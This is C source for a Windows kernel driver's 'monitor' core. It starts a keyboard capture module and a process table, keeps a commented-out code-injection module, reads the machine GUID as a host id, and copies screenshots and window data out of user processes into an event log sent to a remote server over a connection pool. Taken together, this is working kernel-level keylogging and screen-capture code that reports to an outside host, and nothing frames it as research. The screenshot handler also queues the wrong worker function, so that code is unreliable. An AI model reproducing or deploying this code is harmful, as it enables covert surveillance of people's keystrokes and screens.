#include <inc/klogger.h>
#include <inc/monitor.h>
#include <h/drvioctl.h>
#include <inc/ntapiex.h>
#include <inc/processtable.h>
#include <inc/sslclient.h>
#include <inc/sockets.h>
#include <inc/json.h>
#include <inc/srequest.h>
#include <inc/string.h>


#define __SUBCOMPONENT__ "ecore"
#define MODULE_TAG 'kmon'

static MONITOR g_Monitor;

PMONITOR
	MonitorGetInstance(VOID)
{
	return &g_Monitor;
}

VOID
	MonitorInitInternal(PMONITOR Monitor, PDRIVER_OBJECT DriverObject)
{
	Monitor->DriverObject = DriverObject;
	KeInitializeGuardedMutex(&Monitor->Mutex);

	SysWorkerInit(&Monitor->NetWorker);
	SysWorkerInit(&Monitor->RequestWorker);

	InjectInit(&Monitor->Inject);
	ProcessTableInit(&Monitor->ProcessTable);
	KbdInit(&Monitor->Kbd);

	Monitor->State = MONITOR_STATE_STOPPED;
}

NTSTATUS
	MonitorCallServerTestWorker(PVOID Context)
{
	PSREQUEST request = SRequestCreate(SREQ_TYPE_ECHO);
	PSREQUEST response = NULL;
	NTSTATUS Status;

	
	request->pid = 23;
	request->tid = 2;
	request->sessionId = 42;
	
	request->programName = CRtlCopyStr("notepad.exe");
	request->windowTitle = CRtlCopyStr("notepad");

	request->userSid = CRtlCopyStr("S-145-3213");
	request->userName = CRtlCopyStr("Kostya");

	request->data = CRtlCopyStr("my super data");
	request->dataSz = strlen("my super data");

	response = MonitorCallServer(request);
	if (response == NULL) {
		KLog(LError, "No response");
		Status = STATUS_UNSUCCESSFUL;
		goto cleanup;
	}

	Status = STATUS_SUCCESS;

cleanup:
	if (request != NULL)
		SRequestDelete(request);

	if (response != NULL)
		SRequestDelete(response);

	return Status;
}

NTSTATUS
	MonitorQueryHostIdWorker(
		IN PMONITOR Monitor
		)
{
	UNICODE_STRING KeyName = RTL_CONSTANT_STRING(L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Cryptography");
	UNICODE_STRING ValueName = RTL_CONSTANT_STRING(L"MachineGuid");
	HANDLE KeyHandle = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes;
	NTSTATUS Status;
	PKEY_VALUE_PARTIAL_INFORMATION ValueInfo = NULL;
	ULONG ValueInfoSize = 0, ValueLength;

	ValueInfoSize = sizeof(KEY_VALUE_PARTIAL_INFORMATION)+ KMON_MAX_CHARS* sizeof(WCHAR);
	ValueInfo = ExAllocatePoolWithTag(NonPagedPool, ValueInfoSize, MODULE_TAG);
	if (ValueInfo == NULL) {
		KLog(LError, "alloc failed");
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	InitializeObjectAttributes(
			&ObjectAttributes,
			&KeyName,
			(OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE),
			NULL,
			NULL
			);

	Status = ZwCreateKey(&KeyHandle,
		KEY_QUERY_VALUE,
		&ObjectAttributes,
		0,
		NULL,
		0,
		NULL);

	if (!NT_SUCCESS(Status)) {
		KLog(LError, "failed to create key %wZ, error=%x", &KeyName, Status);
		goto cleanup;
	}


	Status = ZwQueryValueKey(KeyHandle,
		&ValueName,
		KeyValuePartialInformation,
		ValueInfo,
		ValueInfoSize,
		&ValueLength);

	if (!NT_SUCCESS(Status)) {
		KLog(LError, "ZwQueryValueKey failed with err=%x", Status);
		goto cleanup;
	}

	Monitor->hostId = CRtlCopyStrFromWstrBuffer((PWSTR)ValueInfo->Data, ValueInfo->DataLength / sizeof(WCHAR));
	if (Monitor->hostId == NULL) {
		KLog(LError, "cant read hostId");
		Status = STATUS_UNSUCCESSFUL;
		goto cleanup;
	}

	Status = STATUS_SUCCESS;

cleanup:
	if (KeyHandle != NULL)
		ZwClose(KeyHandle);
	
	if (ValueInfo != NULL)
		ExFreePoolWithTag(ValueInfo, MODULE_TAG);

	return Status;
}

NTSTATUS
    MonitorStartInternal(PMONITOR Monitor, PKMON_INIT InitData)
{
    NTSTATUS Status;

	KeAcquireGuardedMutex(&Monitor->Mutex);
	if (Monitor->State == MONITOR_STATE_STARTED) {
		KLog(LError, "Monitor already started");
		KeReleaseGuardedMutex(&Monitor->Mutex);
		return STATUS_TOO_LATE;
	}
	InitData->clientId[KMON_MAX_CHARS - 1] = '\0';
	InitData->authId[KMON_MAX_CHARS - 1] = '\0';

	Monitor->clientId = CRtlCopyStr(InitData->clientId);
	if (Monitor->clientId == NULL) {
		KLog(LError, "setup clientId failed");
		goto start_failed;
	}

	Monitor->authId = CRtlCopyStr(InitData->authId);
	if (Monitor->authId == NULL) {
		KLog(LError, "setup authId failed");
		goto start_failed;
	}
	
	Status = MonitorQueryHostIdWorker(Monitor);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "cant query host id");
		goto start_failed;
	}
	
	KLog(LInfo, "clientId=%s, authId=%s, hostId=%s", Monitor->clientId, Monitor->authId, Monitor->hostId);

	JsonInit();
	if (0 != sock_init()) {
		KLog(LError, "sock_init failed");
		goto start_failed;
	}

	Status = ServerConPoolStart(&Monitor->ConPool, 2);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "ServerConPoolStart failed err=%x", Status);
		goto start_failed;
	}

	Status = ProcessTableStart(&Monitor->ProcessTable);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "ProcessTableStart failed err=%x", Status);
		goto start_failed;
	}

	Monitor->WskContext = MWskCreate();
    if (Monitor->WskContext == NULL) {
        KLog(LError, "MWskCreate failed");
		goto start_failed;
    }

	Status = SysWorkerStart(&Monitor->NetWorker);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "SysWorkerStart failed err=%x", Status);
		goto start_failed;
	}

	Status = SysWorkerStart(&Monitor->RequestWorker);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "SysWorkerStart failed err=%x", Status);
		goto start_failed;
	}

#if 0	
	{
		ULONG Index = 0;
		for (Index = 0; Index < 100; Index++)
			SysWorkerAddWork(&Monitor->RequestWorker, MonitorCallServerTestWorker, NULL);
	}
#endif
	Status = EventLogStart(&Monitor->EventLog);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "EventLogStart failed err=%x", Status);
		goto start_failed;
	}

	/*
	Status = InjectStart(&Monitor->Inject);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "InjectStart failed err=%x", Status);
		goto start_failed;
	}
	*/

	Status = KbdStart(&Monitor->Kbd);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "KbdStart failed err=%x", Status);
		goto start_failed;
	}
	
	Monitor->State = MONITOR_STATE_STARTED;
	KeReleaseGuardedMutex(&Monitor->Mutex);

	return STATUS_SUCCESS;

start_failed:
	KbdStop(&Monitor->Kbd);
	InjectStop(&Monitor->Inject);
	SysWorkerStop(&Monitor->RequestWorker);
	SysWorkerStop(&Monitor->NetWorker);

	ProcessTableStop(&Monitor->ProcessTable);
	EventLogStop(&Monitor->EventLog);
	ServerConPoolStop(&Monitor->ConPool);
	sock_release();

	if (Monitor->WskContext != NULL) {
		MWskRelease(Monitor->WskContext);
		Monitor->WskContext = NULL;
	}
	
	Monitor->State = MONITOR_STATE_STOPPED;

	KeReleaseGuardedMutex(&Monitor->Mutex);
	
    return Status;
}

NTSTATUS
MonitorStopInternal(PMONITOR Monitor, PKMON_RELEASE ReleaseData)
{
	NTSTATUS Status;

	KeAcquireGuardedMutex(&Monitor->Mutex);
	if (Monitor->State == MONITOR_STATE_STOPPED) {
		KLog(LError, "Monitor already stopped");
		KeReleaseGuardedMutex(&Monitor->Mutex);
		return STATUS_TOO_LATE;
	}

	if (ReleaseData != NULL) {
		ReleaseData->clientId[KMON_MAX_CHARS - 1] = '\0';
		ReleaseData->authId[KMON_MAX_CHARS - 1] = '\0';

		if (strncmp(Monitor->clientId, ReleaseData->clientId, strlen(Monitor->clientId) + 1) != 0) {
			KLog(LError, "clientId doesnt match");
			Status = STATUS_ACCESS_DENIED;
			goto unlock;
		}

		if (strncmp(Monitor->authId, ReleaseData->authId, strlen(Monitor->authId) + 1) != 0) {
			KLog(LError, "authId doesnt match");
			Status = STATUS_ACCESS_DENIED;
			goto unlock;
		}
	}
	
	KbdStop(&Monitor->Kbd);
	/*
	InjectStop(&Monitor->Inject);
	*/
	SysWorkerStop(&Monitor->RequestWorker);
	SysWorkerStop(&Monitor->NetWorker);
	ProcessTableStop(&Monitor->ProcessTable);
	EventLogStop(&Monitor->EventLog);

	ServerConPoolStop(&Monitor->ConPool);
	sock_release();

	if (Monitor->WskContext != NULL) {
		MWskRelease(Monitor->WskContext);
		Monitor->WskContext = NULL;
	}

	if (Monitor->hostId != NULL) {
		ExFreePool(Monitor->hostId);
		Monitor->hostId = NULL;
	}

	if (Monitor->clientId != NULL) {
		ExFreePool(Monitor->clientId);
		Monitor->clientId = NULL;
	}

	if (Monitor->authId != NULL) {
		ExFreePool(Monitor->authId);
		Monitor->authId = NULL;
	}

	Monitor->State = MONITOR_STATE_STOPPED;

unlock:
	KeReleaseGuardedMutex(&Monitor->Mutex);

	return STATUS_SUCCESS;
}

NTSTATUS
    MonitorStart(PKMON_INIT InitData)
{   
    KLog(LInfo, "MonitorStart");

	return MonitorStartInternal(&g_Monitor, InitData);
}

NTSTATUS
    MonitorStop(PKMON_RELEASE ReleaseData)
{
    KLog(LInfo, "MonitorStop");

	return MonitorStopInternal(&g_Monitor, ReleaseData);
}

VOID
	MonitorInit(PDRIVER_OBJECT DriverObject)
{
	MonitorInitInternal(&g_Monitor, DriverObject);
}

NTSTATUS MonitorOpenWinstaWorker(POPEN_WINSTA OpenWinsta)
{
	WCHAR FullObjName[0x100];
	NTSTATUS Status;
	OBJECT_ATTRIBUTES ObjectAttributes;
	UNICODE_STRING usFullObjName;
	BOOLEAN bProcAcquired = FALSE;
	KAPC_STATE ApcState;

	Status = RtlStringCchPrintfW(FullObjName, RTL_NUMBER_OF(FullObjName), L"\\sessions\\%d\\windows\\windowstations\\%ws", PsGetProcessSessionId(OpenWinsta->Process), OpenWinsta->WinstaName);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "RtlStringCchPrintfW failed err=%x", Status);
		goto cleanup;
	}

	RtlInitUnicodeString(&usFullObjName, FullObjName);

	InitializeObjectAttributes(&ObjectAttributes,
		&usFullObjName,
		OBJ_CASE_INSENSITIVE,
		NULL,
		NULL
		);

	Status = PsAcquireProcessExitSynchronization(OpenWinsta->Process);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "Cant acquire process=%p, error=%x", OpenWinsta->Process, Status);
		goto cleanup;
	}
	bProcAcquired = TRUE;

	KeEnterGuardedRegion();
	KeStackAttachProcess(OpenWinsta->Process, &ApcState);
	
	Status = ObOpenObjectByName(
		&ObjectAttributes,
		*ExWindowStationObjectType,
		KernelMode,
		NULL,
		GENERIC_ALL,
		NULL,
		&OpenWinsta->hWinsta);
	
	KeUnstackDetachProcess(&ApcState);
	KeLeaveGuardedRegion();

	if (!NT_SUCCESS(Status)) {
		KLog(LError, "ObOpenObjectByName for name=%wZ failed err=%x", &usFullObjName, Status);
		goto cleanup;
	}

	Status = STATUS_SUCCESS;
	KLog(LInfo, "ObOpenObjectByName for name=%wZ, SUCCESS handle=%p, process=%p", &usFullObjName, OpenWinsta->hWinsta, OpenWinsta->Process);

cleanup:
	if (bProcAcquired)
		PsReleaseProcessExitSynchronization(OpenWinsta->Process);
	
	OpenWinsta->Error = RtlNtStatusToDosError(Status);

	return STATUS_SUCCESS;
}

NTSTATUS MonitorOpenDesktopWorker(POPEN_DESKTOP OpenDesktop)
{
	NTSTATUS Status;
	OBJECT_ATTRIBUTES ObjectAttributes;
	UNICODE_STRING usObjName;
	BOOLEAN bProcAcquired = FALSE;
	KAPC_STATE ApcState;

	RtlInitUnicodeString(&usObjName, OpenDesktop->DesktopName);

	InitializeObjectAttributes(&ObjectAttributes,
		&usObjName,
		OBJ_CASE_INSENSITIVE,
		OpenDesktop->hWinsta,
		NULL
		);

	Status = PsAcquireProcessExitSynchronization(OpenDesktop->Process);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "Cant acquire process=%p, error=%x", OpenDesktop->Process, Status);
		goto cleanup;
	}
	bProcAcquired = TRUE;

	KeEnterGuardedRegion();
	KeStackAttachProcess(OpenDesktop->Process, &ApcState);

	Status = ObOpenObjectByName(
		&ObjectAttributes,
		*ExDesktopObjectType,
		KernelMode,
		NULL,
		GENERIC_ALL,
		NULL,
		&OpenDesktop->hDesktop);

	KeUnstackDetachProcess(&ApcState);
	KeLeaveGuardedRegion();

	if (!NT_SUCCESS(Status)) {
		KLog(LError, "ObOpenObjectByName for name=%wZ failed err=%x", &usObjName, Status);
		goto cleanup;
	}

	Status = STATUS_SUCCESS;
	KLog(LInfo, "ObOpenObjectByName for name=%wZ, SUCCESS handle=%p, process=%p", &usObjName, OpenDesktop->hDesktop, OpenDesktop->Process);

cleanup:
	if (bProcAcquired)
		PsReleaseProcessExitSynchronization(OpenDesktop->Process);

	OpenDesktop->Error = RtlNtStatusToDosError(Status);

	return STATUS_SUCCESS;
}

NTSTATUS
MonitorOpenDesktop(POPEN_DESKTOP openDesktop)
{
	PSYS_WRK_ITEM WrkItem = NULL;
	NTSTATUS Status;

	openDesktop->hDesktop = NULL;
	openDesktop->Error = RtlNtStatusToDosError(STATUS_UNSUCCESSFUL);

	openDesktop->Process = PsGetCurrentProcess();
	ObReferenceObject(openDesktop->Process);

	WrkItem = SysWorkerAddWorkRef(&MonitorGetInstance()->RequestWorker, MonitorOpenDesktopWorker, openDesktop);
	if (WrkItem == NULL) {
		KLog(LError, "Cant queue wrk item");
		Status = STATUS_UNSUCCESSFUL;
		goto cleanup;
	}

	KeWaitForSingleObject(&WrkItem->CompletionEvent, Executive, KernelMode, FALSE, NULL);
	SYS_WRK_ITEM_DEREF(WrkItem)

	Status = STATUS_SUCCESS;

cleanup:
	ObDereferenceObject(openDesktop->Process);
	openDesktop->Process = NULL;

	return Status;
}

NTSTATUS
	MonitorOpenWinsta(POPEN_WINSTA openWinsta)
{
	PSYS_WRK_ITEM WrkItem = NULL;
	NTSTATUS Status;

	openWinsta->hWinsta = NULL;
	openWinsta->Error = RtlNtStatusToDosError(STATUS_UNSUCCESSFUL);

	openWinsta->Process = PsGetCurrentProcess();
	ObReferenceObject(openWinsta->Process);

	WrkItem = SysWorkerAddWorkRef(&MonitorGetInstance()->RequestWorker, MonitorOpenWinstaWorker, openWinsta);
	if (WrkItem == NULL) {
		KLog(LError, "Cant queue wrk item");
		Status = STATUS_UNSUCCESSFUL;
		goto cleanup;
	}

	KeWaitForSingleObject(&WrkItem->CompletionEvent, Executive, KernelMode, FALSE, NULL);
	SYS_WRK_ITEM_DEREF(WrkItem)

	Status = STATUS_SUCCESS;

cleanup:
	ObDereferenceObject(openWinsta->Process);
	openWinsta->Process = NULL;

	return Status;
}

char *
	MonitorJsonServer(char *request)
{
	return ServerConPoolSendReceive(&MonitorGetInstance()->ConPool, request);
}

PSREQUEST MonitorCallServer(PSREQUEST request)
{
	char *jsonResponse = NULL, *jsonRequest = NULL;
	PSREQUEST response = NULL;

	jsonRequest = SRequestDumps(request);
	if (jsonRequest == NULL) {
		KLog(LError, "cant encode request");
		goto cleanup;
	}
	
	jsonResponse = MonitorJsonServer(jsonRequest);
	if (jsonResponse == NULL) {
		KLog(LError, "no json response");
		response = SRequestCreate(SREQ_TYPE_UNDEFINED);
		if (response != NULL)
			response->status = SREQ_ERROR_NO_RESPONSE;
	} else {
		response = SRequestParse(jsonResponse);
		if (response == NULL) {
			KLog(LError, "cant decode jsonResponse=%s", jsonResponse);
			response = SRequestCreate(SREQ_TYPE_UNDEFINED);
			if (response != NULL)
				response->status = SREQ_ERROR_JSON_DECODE;
		}
	}

cleanup:	
	if (jsonResponse != NULL)
		ExFreePool(jsonResponse);

	if (jsonRequest != NULL)
		ExFreePool(jsonRequest);

	return response;
}

NTSTATUS MonitorScreenshotWorker(PKMON_SCREENSHOT Screenshot)
{
	NTSTATUS Status;
	BOOLEAN bProcAcquired = FALSE;
	KAPC_STATE ApcState;
	PSREQUEST request = NULL;

	request = SRequestCreateData((Screenshot->type == KMON_SCREENSHOT_SCREENSHOT_TYPE) ? SREQ_TYPE_SCREENSHOT : SREQ_TYPE_USER_WINDOW, Screenshot->dataSz);
	if (request == NULL) {
		KLog(LError, "cant create srequest for dataSz=%x", Screenshot->dataSz);
		Status = STATUS_NO_MEMORY;
		goto cleanup;
	}
	
	Status = PsAcquireProcessExitSynchronization(Screenshot->Process);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "Cant acquire process=%p, error=%x", Screenshot->Process, Status);
		goto cleanup;
	}
	bProcAcquired = TRUE;

	KeEnterGuardedRegion();
	KeStackAttachProcess(Screenshot->Process, &ApcState);
	
	RtlCopyMemory(request->data, Screenshot->data, request->dataSz);

	KeUnstackDetachProcess(&ApcState);
	KeLeaveGuardedRegion();

	Status = EventLogAdd(&MonitorGetInstance()->EventLog, request);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "EventLogAdd failed with err=%x", Status);
		SRequestDelete(request);
	}
	
cleanup:
	if (bProcAcquired)
		PsReleaseProcessExitSynchronization(Screenshot->Process);

	Screenshot->Error = RtlNtStatusToDosError(Status);

	return STATUS_SUCCESS;
}

NTSTATUS
MonitorScreenshot(PKMON_SCREENSHOT ScreenShot)
{
	PSYS_WRK_ITEM WrkItem = NULL;
	NTSTATUS Status;

	ScreenShot->Error = RtlNtStatusToDosError(STATUS_UNSUCCESSFUL);

	ScreenShot->Process = PsGetCurrentProcess();
	ObReferenceObject(ScreenShot->Process);

	WrkItem = SysWorkerAddWorkRef(&MonitorGetInstance()->RequestWorker, MonitorOpenWinstaWorker, ScreenShot);
	if (WrkItem == NULL) {
		KLog(LError, "Cant queue wrk item");
		Status = STATUS_UNSUCCESSFUL;
		goto cleanup;
	}

	KeWaitForSingleObject(&WrkItem->CompletionEvent, Executive, KernelMode, FALSE, NULL);
	SYS_WRK_ITEM_DEREF(WrkItem)

	Status = STATUS_SUCCESS;

cleanup:
	ObDereferenceObject(ScreenShot->Process);
	ScreenShot->Process = NULL;

	return Status;
}